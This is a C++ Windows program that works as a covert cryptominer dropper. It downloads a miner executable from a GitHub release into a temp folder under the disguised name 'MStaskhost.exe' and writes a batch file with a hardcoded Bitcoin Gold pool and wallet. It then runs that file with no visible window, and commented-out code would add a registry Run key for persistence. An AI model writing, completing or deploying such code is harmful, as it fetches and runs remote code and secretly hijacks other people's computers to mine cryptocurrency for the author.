#include <cpr/cpr.h>
#include <nlohmann/json.hpp>
#include <string.h>
#include <Windows.h>
#include <fstream>
#include <iostream>
#include <filesystem>
#include <boost/filesystem.hpp>

boost::filesystem::path getTempDir() {
	boost::filesystem::path tempDir = boost::filesystem::temp_directory_path();
	return tempDir;
}

void createTempFolder() {
	boost::filesystem::path tempDir = getTempDir();
	// create a folder inside the temp directory called "mstemp"
	boost::filesystem::path tempFolder = tempDir / "mstemp";
	if (!boost::filesystem::exists(tempFolder)) {
		boost::filesystem::create_directory(tempFolder);
	} else {
		boost::filesystem::remove_all(tempFolder);
		boost::filesystem::create_directory(tempFolder);
	}
}

boost::filesystem::path getProgramTempFolder() {
	boost::filesystem::path tempDir = getTempDir();
	// return path of the temp folder "mstemp"
	return tempDir / "mstemp";
}

void StringToWString(std::wstring &ws, const std::string &s)
{
    std::wstring wsTmp(s.begin(), s.end());

    ws = wsTmp;
}

void getProgram() {
	// path to download to
	// first check if program is already downloaded
	boost::filesystem::path tempDir = getProgramTempFolder();
	tempDir /= "MStaskhost.exe";
	if (boost::filesystem::exists(tempDir)) {
		// program is already downloaded
		return;
	}
	// to string
	std::string tempDirStr = tempDir.string();
	std::cout << tempDirStr;
	std::wstring ws;
	StringToWString(ws, tempDirStr);
	URLDownloadToFile(NULL, L"https://github.com/kevlu8/my-stuff/releases/download/2/miner.exe", ws.c_str(), 0, NULL);
}

std::string randomString(int length) {
	// set random seed
	srand(time(NULL));
	std::string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	std::string randomString;
	for (int i = 0; i < length; i++) {
		int randomIndex = rand() % alphabet.length();
		randomString += alphabet[randomIndex];
	}
	return randomString;
}

int runProgram() {
	// path to download to
	boost::filesystem::path tempDir = getProgramTempFolder();
	tempDir /= "MStaskhost.exe";
	// to string
	std::string tempDirStr = tempDir.string();
	std::string worker = randomString(10);
	// run program
	std::string command = tempDirStr + " --algo 144_5 --pers BgoldPoW --server us-btg.2miners.com --port 4040 --user AbUEAYp1pzxDmSzfXmpvnxfSoZCCWpDEWC --worker " + worker + " --pass x";
	std::cout << command << std::endl;
	// run program detached
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	std::string stuffToPutInsideBatFile = "@echo off\n" + command + "\n";
	// save into run.bat
	std::ofstream batFile;
	boost::filesystem::path tempDir2 = getProgramTempFolder() / "run.bat";
	batFile.open(tempDir2.string());
	batFile << stuffToPutInsideBatFile;
	batFile.close();
	// run bat file
	// std::string batFilePath = "run.bat";
	// std::wstring ws;
	// StringToWString(ws, batFilePath);
	// std::wstring filename = ws;
	if (!CreateProcessW(NULL, (LPWSTR)tempDir2.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		std::cout << "CreateProcess failed: " << GetLastError() << std::endl;
		return 1;
	}
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return 0;
}

INT WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
	createTempFolder();
	getProgram();
	runProgram();
	// make program run at startup
	//boost::filesystem::path filepath = getProgramTempFolder() / "run.bat";
	//std::string progPath = filepath.string();
	//HKEY hkey = NULL;
	//LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
	//LONG status = RegSetValueEx(hkey, L"Taskhost", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));
	return 0;
}